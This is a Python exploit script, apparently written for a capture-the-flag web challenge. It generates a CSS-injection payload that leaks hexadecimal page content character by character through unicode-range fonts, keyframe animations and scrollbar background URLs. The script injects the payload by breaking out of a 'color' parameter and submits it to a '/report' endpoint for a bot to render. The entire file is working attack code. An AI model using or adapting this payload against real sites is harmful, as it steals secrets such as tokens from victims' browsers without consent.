from math import fabs
from ssl import cert_time_to_seconds
from PIL import ImageFont
from fontTools.ttLib import TTFont
import string
import requests
from urllib.parse import quote, quote_plus

FONT = 'DejaVu Sans Mono'
TARGET_URL = 'http://127.0.0.1:8000'

def create_family(family,range,size):
    font_face = "@font-face{{font-family:{family};size-adjust:{size};src:local('"+FONT+"');unicode-range:{uni_range};font-style:monospace;}}"
    uni_range = ''
    if range is not None:
        uni_range+='U+'+hex(ord(range))[2:]
    else:
        uni_range+='U+?????'
    if family is None:
        if range is None:
            family = 'rest'
            size = '100%'
        else:
            family = 'has_'+hex(ord(range))[2:]
    return family,font_face.format(family=family,uni_range=uni_range,size=size)


def create_animation(n,w,families,url):
    animation = ''
    outer = "@keyframes loop {{\n {frames} \n}}"
    frame = "{x}% {{ width: {w}px; }}"
    frames = ''
    for i in range(0,n):
        frames+=frame.format(x=i,w=w*(i+2))+'\n'

    animation = outer.format(frames=frames)+'\n'

    inner = "@keyframes trychar{num} {{\n {frames_inner} \n}}"
    frame_inner = "{x}% {{ {content} }}"
    frames_inner = ''
    reset_f = "font-family: rest;"
    set_f = "font-family: {family}, rest; --leak: url({url}?{letter});"

    i = 0
    num = 0
    for k,v in families.items():
        content = ''
        content = reset_f
        frames_inner += frame_inner.format(x=i,content=content)+'\n'
        i+=1
        content = set_f.format(family=v,letter=k,url=url)
        frames_inner += frame_inner.format(x=i,content=content)+'\n'
        i+=1
        if(i==100):
            content = reset_f
            frames_inner += frame_inner.format(x=i,content=content)+'\n'
            animation+=inner.format(frames_inner=frames_inner,num=num) + '\n'
            frames_inner = ''
            i=0
            num+=1
    
    animation+=inner.format(frames_inner=frames_inner,num=num)
    return num+1,animation

def create_leak_style(selector,h,num,n):
    scrollbar = "{selector}::-webkit-scrollbar {{ background: blue; }}\n{selector}::-webkit-scrollbar:vertical {{ background: var(--leak); }}"
    leak = "{selector}::first-line{{ font-size: 30px; }}"
    main = "{selector} {{ overflow-y: auto; overflow-x: hidden; font-size: 0px; height: {h}px; width: 0px; {animation} font-family: rest; word-break: break-all; }}"
    animation = 'animation: '
    animation_it = 'animation-iteration-count: '
    for i in range(0,num):
        if animation != 'animation: ':
            animation+=','
            animation_it+=','
        animation+='loop step-end {n}s {n2}s, trychar{i} step-end 1s {n2}s'.format(i=i,n=n,n2=n*i)
        animation_it+='1 , {n}'.format(n=n)
    animation+=';'
    animation_it+=';'
    animation+=animation_it
    leak = scrollbar.format(selector=selector)+'\n'+leak.format(selector=selector)+'\n'+main.format(selector=selector,h=h,animation=animation)
    return leak

def create_stylesheet(n,selector,url):
    stylesheet = ""
    families = {}
    font = ImageFont.truetype('/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf',size=30)
    w,h = font.getsize('A')
    for i in "abcdefABCDEF0123456789":
        family, style = create_family(family=None,range=i,size='200%')
        stylesheet+=style+'\n'
        families[i] = family
    family, style = create_family(family=None,range=None,size='200%')
    stylesheet+=style+'\n'
    families[i] = family

    num,animation = create_animation(n,w,families,url)

    stylesheet+='\n'+animation
    leak = create_leak_style(selector,h+h//2,num,n)
    stylesheet+='\n'+leak+'\n'
    return stylesheet

def send_stylesheet():
    s=create_stylesheet(3,'div','http://127.0.0.1:8000/')
    color = quote_plus(quote("blue;}\n" + s + "\nbody{color:white"))
    #res = requests.get(f"{TARGET_URL}/?sentence=Yab&color={color}")
    color = quote_plus(f"?color={color}")
    res = requests.get(f"{TARGET_URL}/report?path={color}")
    #print(res.url)

send_stylesheet()
